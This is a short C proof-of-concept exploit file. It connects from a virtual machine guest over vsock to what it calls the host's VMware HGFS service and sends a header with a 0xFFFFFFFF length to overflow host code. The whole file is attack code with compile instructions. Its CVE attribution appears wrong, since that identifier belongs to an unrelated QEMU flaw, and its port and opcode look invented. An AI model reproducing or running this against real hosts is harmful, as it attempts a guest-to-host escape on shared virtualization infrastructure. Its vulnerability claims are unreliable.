/*
 * C PoC for VMware Tools HGFS vsock overflow (CVE-2016-5338)
 *
 * Opens a Linux vsock to the host’s HGFS service and submits
 * a packet header with a 0xFFFFFFFF length field, overflowing
 * the host’s HGFS code path.
 *
 * Compile with: gcc -o poc_hgfs_vsock poc_hgfs_vsock.c
 */

#include <sys/socket.h>
#include <linux/vm_sockets.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// VMADDR_CID_HOST == 2 targets the host end of vsock
#define VMADDR_CID_HOST  2
#define HGFS_VSOCK_PORT  0x4003   // host’s HGFS port (16387)

int main() {
    int sock = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
        .svm_port   = HGFS_VSOCK_PORT,
        .svm_cid    = VMADDR_CID_HOST
    };
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        return 1;
    }
    printf("[+] Connected to host HGFS vsock %u:%u\n",
           addr.svm_cid, addr.svm_port);

    // Build malicious header
    uint32_t opcode = 5;             // example HGFS OP code
    uint32_t length = 0xFFFFFFFF;    // triggers overflow
    uint8_t  buf[8];
    memcpy(buf + 0, &opcode, sizeof(opcode));
    memcpy(buf + 4, &length, sizeof(length));

    printf("[+] Sending overflow header: opcode=0x%x, length=0x%x\n",
           opcode, length);
    if (write(sock, buf, sizeof(buf)) != sizeof(buf)) {
        perror("write");
    }

    close(sock);
    return 0;
}